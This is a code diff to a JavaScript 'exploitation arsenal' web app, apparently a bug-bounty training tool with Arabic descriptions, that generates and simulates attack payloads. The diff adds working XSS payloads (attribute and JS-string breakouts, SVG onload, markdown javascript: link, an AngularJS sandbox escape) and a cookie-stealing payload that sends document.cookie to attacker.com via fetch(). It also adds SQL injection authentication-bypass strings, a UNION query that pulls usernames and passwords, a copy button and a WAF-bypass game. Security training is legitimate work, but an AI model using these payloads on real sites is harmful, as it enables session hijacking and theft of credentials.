@@ -1,5 +1,5 @@
 // ==========================================
-// PRO EXPLOITATION ARSENAL ENGINE (v6 Pro Suite)
+// PRO EXPLOITATION ARSENAL ENGINE (v6.1 Complete)
 // ==========================================
 
 const VulnData = {
@@ -196,6 +196,185 @@ const PayloadTemplates = {
           { title: "Execution Fired", desc: "Alert triggered." }
         ],
         desc: "يقوم بكسر سمة الـ HTML (Attribute) التي تستخدم علامتي التنصيص المزدوجة باستخدام `\">` ثم يحقن الكود."
+      },
+      attribute_sq: {
+        code: "'><script>alert(document.domain)</script>",
+        breakout: "'>",
+        template: "<input type='text' name='search' value='[USER_INPUT]'>",
+        simulatedType: "dialog",
+        simulatedVal: "example.com",
+        owasp: "A03:2021 - Injection",
+        cwe: "CWE-79",
+        capec: "CAPEC-63",
+        stars: "★★★☆☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Single Quote Context"],
+        pipeline: [
+          { title: "Attribute Injection", desc: "Injected in single quote." }
+        ],
+        desc: "يقوم بكسر سمة الـ HTML التي تستخدم علامة التنصيص المفردة باستخدام `'>`."
+      },
+      script_string: {
+        code: "\"; alert(document.domain); //",
+        breakout: "\";",
+        template: "<script> var keyword = \"[USER_INPUT]\"; </script>",
+        simulatedType: "dialog",
+        simulatedVal: "example.com",
+        owasp: "A03:2021 - Injection",
+        cwe: "CWE-79",
+        capec: "CAPEC-63",
+        stars: "★★★★☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["JS String Context"],
+        pipeline: [
+          { title: "JS String Breakout", desc: "\"; terminates string." }
+        ],
+        desc: "يقوم بكسر السلسلة النصية داخل كود جافاسكريبت باستخدام `\";` لتنفيذ الكود."
+      },
+      svg: {
+        code: "<svg onload=alert(1)>",
+        breakout: "",
+        template: "<div>[USER_INPUT]</div>",
+        simulatedType: "dialog",
+        simulatedVal: "1",
+        owasp: "A03:2021 - Injection",
+        cwe: "CWE-79",
+        capec: "CAPEC-63",
+        stars: "★★★☆☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Allowed SVG tags"],
+        pipeline: [
+          { title: "SVG Injection", desc: "<svg> parsed." }
+        ],
+        desc: "يستخدم وسم `svg` مع حدث `onload` لتخطي فلاتر `script`."
+      },
+      markdown: {
+        code: "[a](javascript:alert(1))",
+        breakout: "",
+        template: "<div>[USER_INPUT]</div>",
+        simulatedType: "dialog",
+        simulatedVal: "1",
+        owasp: "A03:2021 - Injection",
+        cwe: "CWE-79",
+        capec: "CAPEC-63",
+        stars: "★★☆☆☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Markdown Parser"],
+        pipeline: [
+          { title: "Markdown Injection", desc: "Link parsed." }
+        ],
+        desc: "يستغل معالجات الـ Markdown التي لا تقوم بفلترة سمة `href`."
+      },
+      angular: {
+        code: "{{$on.constructor('alert(1)')()}}",
+        breakout: "{{",
+        template: "<div ng-app>[USER_INPUT]</div>",
+        simulatedType: "dialog",
+        simulatedVal: "1",
+        owasp: "A03:2021 - Injection",
+        cwe: "CWE-94",
+        capec: "CAPEC-63",
+        stars: "★★★★★",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["AngularJS Framework"],
+        pipeline: [
+          { title: "Sandbox Escape", desc: "$on.constructor called." }
+        ],
+        desc: "تخطي حماية (Sandbox) الخاصة ببيئة AngularJS لتنفيذ الكود."
+      }
+    },
+    cookie_steal: {
+      html_body: {
+        code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
+        breakout: "",
+        template: "<div>Profile Name: [USER_INPUT]</div>",
+        simulatedType: "network",
+        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
+        owasp: "A03:2021 - Injection",
+        cwe: "CWE-79",
+        capec: "CAPEC-63",
+        stars: "★★★☆☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Cookies without HttpOnly"],
+        pipeline: [
+          { title: "Exfiltration", desc: "Cookies sent via fetch()." }
+        ],
+        desc: "يسرق ملفات تعريف الارتباط (Cookies) ويرسلها للمخترق."
+      }
+    }
+  },
+  sqli: {
+    auth_bypass: {
+      int: {
+        code: "1 OR 1=1",
+        breakout: "",
+        template: "SELECT * FROM users WHERE id = [USER_INPUT] AND active = 1;",
+        simulatedType: "terminal",
+        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
+        owasp: "A03:2021 - SQL Injection",
+        cwe: "CWE-89",
+        capec: "CAPEC-66",
+        stars: "★★☆☆☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Unsanitized SQL Parameter"],
+        pipeline: [
+          { title: "SQL Injection", desc: "OR 1=1 appended." },
+          { title: "Bypass Auth", desc: "Always true condition." }
+        ],
+        desc: "تعديل الاستعلام ليكون صحيحاً دائماً (1=1) لتخطي تسجيل الدخول."
+      },
+      string_dq: {
+        code: "\" OR \"1\"=\"1",
+        breakout: "\" OR \"1\"=\"1",
+        template: "SELECT * FROM users WHERE username = \"[USER_INPUT]\" AND password = \"pass\";",
+        simulatedType: "terminal",
+        simulatedVal: "Authentication Bypassed! Logged in as Administrator.",
+        owasp: "A03:2021 - SQL Injection",
+        cwe: "CWE-89",
+        capec: "CAPEC-66",
+        stars: "★★★☆☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Double Quote Context"],
+        pipeline: [
+          { title: "String Breakout", desc: "\" closes string." }
+        ],
+        desc: "يغلق علامة التنصيص المزدوجة ويضيف شرطاً صحيحاً دائماً."
+      },
+      string_sq: {
+        code: "' OR '1'='1",
+        breakout: "' OR '1'='1",
+        template: "SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = 'pass';",
+        simulatedType: "terminal",
+        simulatedVal: "Authentication Bypassed! Logged in as Administrator.",
+        owasp: "A03:2021 - SQL Injection",
+        cwe: "CWE-89",
+        capec: "CAPEC-66",
+        stars: "★★★☆☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Single Quote Context"],
+        pipeline: [
+          { title: "String Breakout", desc: "' closes string." }
+        ],
+        desc: "يغلق علامة التنصيص المفردة ويضيف شرطاً صحيحاً دائماً."
+      }
+    },
+    union_extract: {
+      int: {
+        code: "-1 UNION SELECT username, password FROM users-- -",
+        breakout: "-1 UNION",
+        template: "SELECT id, product_name FROM products WHERE category_id = [USER_INPUT];",
+        simulatedType: "terminal",
+        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john', password: '$2y$10$9a1...'} ]",
+        owasp: "A03:2021 - SQL Injection",
+        cwe: "CWE-89",
+        capec: "CAPEC-66",
+        stars: "★★★★☆",
+        browsers: { chrome: true, firefox: true, safari: true, edge: true },
+        prereqs: ["Equal column count"],
+        pipeline: [
+          { title: "UNION Execution", desc: "Data merged." }
+        ],
+        desc: "دمج نتائج استعلام ثانٍ (UNION) لجلب المستخدمين وكلمات المرور."
       }
     }
   }
@@ -231,7 +410,26 @@ document.addEventListener("DOMContentLoaded", () => {
   const btnViewBurp = document.getElementById("btn-view-burp");
 
   let currentGeneratedPayload = "<script>alert(document.domain)</script>";
-  let currentViewMode = "code"; // "code" or "burp"
+  let currentViewMode = "code";
+
+  // TOAST NOTIFICATION ENGINE
+  function showToast(msg) {
+    const existingToast = document.querySelector(".custom-toast");
+    if (existingToast) existingToast.remove();
+
+    const toast = document.createElement("div");
+    toast.className = "custom-toast";
+    toast.innerHTML = `<i class='bx bx-check-circle'></i> ${msg}`;
+    toast.style.cssText = `
+      position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
+      background: linear-gradient(135deg, #06b6d4, #0284c7); color: #000;
+      padding: 12px 24px; border-radius: 8px; font-weight: bold; font-size: 0.9rem;
+      box-shadow: 0 10px 30px rgba(6, 182, 212, 0.4); z-index: 9999;
+      display: flex; align-items: center; gap: 8px; animation: popUp 0.3s ease;
+    `;
+    document.body.appendChild(toast);
+    setTimeout(() => toast.remove(), 2500);
+  }
 
   function populateDropdowns() {
     const vClass = vulnClassEl.value;
@@ -289,7 +487,6 @@ document.addEventListener("DOMContentLoaded", () => {
     return html;
   }
 
-  // BURP REPEATER HTTP PACKET BUILDER
   function buildBurpRepeaterPacket(payload, vClass) {
     const method = (vClass === 'csrf' || vClass === 'nosqli' || vClass === 'smuggling') ? 'POST' : 'GET';
     const encodedPayload = encodeURIComponent(payload);
@@ -301,7 +498,7 @@ document.addEventListener("DOMContentLoaded", () => {
       body = `\r\n\r\n{"query": "${escapeHtml(payload)}", "token": "session_99f18a"}`;
     }
 
-    return `${method} ${path} HTTP/1.1\r\nHost: target-vulnerable.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBountyAcademy/5.0\r\nAccept: text/html,application/xhtml+xml\r\nCookie: session=xyz123456789; security_level=medium\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${payload.length + 35}${body}`;
+    return `${method} ${path} HTTP/1.1\r\nHost: target-vulnerable.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) BugBountyAcademy/6.1\r\nAccept: text/html,application/xhtml+xml\r\nCookie: session=xyz123456789; security_level=medium\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${payload.length + 35}${body}`;
   }
 
   function updateCodeDisplay() {
@@ -434,15 +631,15 @@ document.addEventListener("DOMContentLoaded", () => {
     
     setTimeout(() => {
       diagTerminal.innerHTML += `<div>[+] Target Context Detected: <span style="color:#fff;">${vContext}</span></div>`;
-    }, 100);
+    }, 80);
 
     setTimeout(() => {
       diagTerminal.innerHTML += `<div style="color:#4ade80;">[SUCCESS] Exploit optimized & rendered!</div>`;
       setTimeout(() => {
         diagTerminal.style.display = "none";
         callback();
-      }, 200);
-    }, 250);
+      }, 150);
+    }, 200);
   }
 
   function generateAndSimulate() {
@@ -498,7 +695,6 @@ document.addEventListener("DOMContentLoaded", () => {
 
   btnGenerate.addEventListener("click", generateAndSimulate);
 
-  // LOCALSTORAGE FAVORITES & HISTORY
   function getFavorites() { return JSON.parse(localStorage.getItem("bba_fav_payloads") || "[]"); }
   function getHistory() { return JSON.parse(localStorage.getItem("bba_hist_payloads") || "[]"); }
 
@@ -518,8 +714,10 @@ document.addEventListener("DOMContentLoaded", () => {
     let favs = getFavorites();
     if (favs.includes(currentGeneratedPayload)) {
       favs = favs.filter(p => p !== currentGeneratedPayload);
+      showToast("Removed from Favorites!");
     } else {
       favs.push(currentGeneratedPayload);
+      showToast("Added to Favorites! ⭐");
     }
     localStorage.setItem("bba_fav_payloads", JSON.stringify(favs));
     checkFavoriteStatus();
@@ -533,30 +731,27 @@ document.addEventListener("DOMContentLoaded", () => {
     localStorage.setItem("bba_hist_payloads", JSON.stringify(hist));
   }
 
+  // COPY BUTTON WITH TOAST
   btnCopy.addEventListener("click", () => {
     if (currentGeneratedPayload) {
       navigator.clipboard.writeText(currentGeneratedPayload).then(() => {
-        btnCopy.innerHTML = "<i class='bx bx-check'></i> Copied!";
-        setTimeout(() => btnCopy.innerHTML = "<i class='bx bx-copy'></i> Copy", 2000);
+        showToast("Payload copied to clipboard! 📋");
       });
     }
   });
 
   btnCopyUrl.addEventListener("click", () => {
     navigator.clipboard.writeText(targetBaseUrlInput.value).then(() => {
-      btnCopyUrl.innerHTML = "<i class='bx bx-check'></i> Copied!";
-      setTimeout(() => btnCopyUrl.innerHTML = "<i class='bx bx-copy'></i> Copy URL", 2000);
+      showToast("Target Testing URL copied! 🔗");
     });
   });
 
-  // HACKERONE REPORT GENERATOR
   function buildHackerOneReport() {
     const vClass = vulnClassEl.value.toUpperCase();
     const vAction = actionEl.value;
-    return `# [Vulnerability Report] ${vClass} - ${vAction} on Target Application\n\n## 1. Vulnerability Overview\nA high-severity **${vClass}** vulnerability was identified in the application. An attacker can exploit this vulnerability to execute arbitrary payloads within the target context.\n\n## 2. Proof of Concept (PoC)\nTarget URL: \`${targetBaseUrlInput.value}\`  \nPayload: \`${currentGeneratedPayload}\`  \n\n## 3. Steps to Reproduce\n1. Navigate to the vulnerable target endpoint.\n2. Inject the following payload into the parameter:\n   \`\`\`\n   ${currentGeneratedPayload}\n   \`\`\`\n3. Observe the execution in the DOM / Server response.\n\n## 4. Impact & Remediation\n- **Impact**: Unauthorized data exfiltration / session hijacking / remote code execution.\n- **Remediation**: Implement strict input validation and contextual output encoding (e.g., HTML Entity encoding or prepared statements).`;
+    return `# [Vulnerability Report] ${vClass} - ${vAction} on Target Application\n\n## 1. Vulnerability Overview\nA high-severity **${vClass}** vulnerability was identified in the application.\n\n## 2. Proof of Concept (PoC)\nTarget URL: \`${targetBaseUrlInput.value}\`  \nPayload: \`${currentGeneratedPayload}\`  \n\n## 3. Steps to Reproduce\n1. Navigate to target endpoint.\n2. Inject payload:\n   \`\`\`\n   ${currentGeneratedPayload}\n   \`\`\`\n3. Observe execution.`;
   }
 
-  // MODALS ENGINE
   const modalToolbox = document.getElementById("modal-toolbox");
   const modalFav = document.getElementById("modal-fav");
   const modalHistory = document.getElementById("modal-history");
@@ -591,67 +786,43 @@ document.addEventListener("DOMContentLoaded", () => {
 
   document.getElementById("btn-copy-report").addEventListener("click", () => {
     navigator.clipboard.writeText(document.getElementById("report-output").textContent).then(() => {
-      alert("HackerOne Report Markdown Copied to Clipboard!");
+      showToast("HackerOne Report copied! 📄");
     });
   });
 
-  document.getElementById("btn-modal-sandbox").addEventListener("click", (e) => {
-    e.preventDefault();
-    closeModals();
-    modalSandbox.style.display = "flex";
-  });
+  document.getElementById("btn-modal-sandbox").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalSandbox.style.display = "flex"; });
+  document.getElementById("btn-modal-game").addEventListener("click", (e) => { e.preventDefault(); closeModals(); modalGame.style.display = "flex"; initWafGame(); });
 
-  document.getElementById("btn-modal-game").addEventListener("click", (e) => {
-    e.preventDefault();
-    closeModals();
-    modalGame.style.display = "flex";
-    initWafGame();
-  });
-
-  // CUSTOM SANDBOX ANALYZER ENGINE
   const sandboxInput = document.getElementById("sandbox-input");
   const sandboxOutput = document.getElementById("sandbox-analysis-output");
   if (sandboxInput) {
     sandboxInput.addEventListener("input", () => {
       const str = sandboxInput.value;
       if (!str) {
-        sandboxOutput.innerHTML = `<span style="color:var(--text-muted);">Type string above to analyze risk score and WAF filtering...</span>`;
+        sandboxOutput.innerHTML = `<span style="color:var(--text-muted);">Type string above...</span>`;
         return;
       }
       const hasScript = str.includes("<script>") || str.includes("alert(");
-      const hasSqli = str.includes("' OR ") || str.includes("UNION SELECT");
-      const isEncoded = str.includes("%") || str.includes("&#");
-      
-      let score = "LOW RISK";
-      let color = "#4ade80";
-      if (hasScript || hasSqli) { score = "HIGH RISK (XSS/SQLi Detected)"; color = "#f87171"; }
-
-      sandboxOutput.innerHTML = `
-        <div><strong style="color:${color};">Risk Score: ${score}</strong></div>
-        <div style="margin-top:8px; color:#cbd5e1;">Analyzed Tokens: <code>${escapeHtml(str)}</code></div>
-        <div style="margin-top:6px; color:#38bdf8;">WAF Evasion Rating: ${isEncoded ? 'HIGH (Encoded String)' : 'LOW (Raw String)'}</div>
-      `;
+      sandboxOutput.innerHTML = `<div><strong style="color:${hasScript ? '#f87171' : '#4ade80'};">Risk Score: ${hasScript ? 'HIGH RISK' : 'LOW RISK'}</strong></div><div>Analyzed: <code>${escapeHtml(str)}</code></div>`;
     });
   }
 
-  // WAF GAME LOGIC
   let currentXp = 100;
   function initWafGame() {
     document.getElementById("game-rule-title").textContent = "Challenge #01: Bypass Naive Regex WAF";
-    document.getElementById("game-rule-desc").textContent = "The target WAF strictly blocks raw '<script>' tags and single quotes. Configure the generator to bypass this rule!";
+    document.getElementById("game-rule-desc").textContent = "The target WAF strictly blocks raw '<script>' tags. Select a Filter or Alternative Context!";
     document.getElementById("game-xp-count").textContent = `${currentXp} XP`;
     document.getElementById("game-feedback").textContent = "";
   }
 
   document.getElementById("btn-submit-game").addEventListener("click", () => {
     const filter = filterEl.value;
-    const vuln = vulnClassEl.value;
-    if (filter !== 'none' || vuln === 'nosqli' || vuln === 'log4j') {
+    if (filter !== 'none') {
       currentXp += 50;
       document.getElementById("game-xp-count").textContent = `${currentXp} XP`;
-      document.getElementById("game-feedback").innerHTML = `<span style="color:#4ade80; font-weight:bold;">🎉 SUCCESS! You bypassed the WAF rule and earned +50 XP!</span>`;
+      document.getElementById("game-feedback").innerHTML = `<span style="color:#4ade80; font-weight:bold;">🎉 SUCCESS! Bypassed WAF (+50 XP)!</span>`;
     } else {
-      document.getElementById("game-feedback").innerHTML = `<span style="color:#f87171;">❌ FAILED! Raw script tag was blocked by the WAF. Select a Filter or Alternative Context!</span>`;
+      document.getElementById("game-feedback").innerHTML = `<span style="color:#f87171;">❌ FAILED! Select a Filter or Encoding!</span>`;
     }
   });
 
@@ -714,11 +885,7 @@ document.addEventListener("DOMContentLoaded", () => {
   if (btnExp) {
     btnExp.addEventListener("click", (e) => {
       e.preventDefault();
-      const data = {
-        currentPayload: currentGeneratedPayload,
-        favorites: getFavorites(),
-        history: getHistory()
-      };
+      const data = { currentPayload: currentGeneratedPayload, favorites: getFavorites(), history: getHistory() };
       const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
       const url = URL.createObjectURL(blob);
       const a = document.createElement("a");
@@ -731,6 +898,5 @@ document.addEventListener("DOMContentLoaded", () => {
     });
   }
 
-  // Initial Run
   generateAndSimulate();
 });
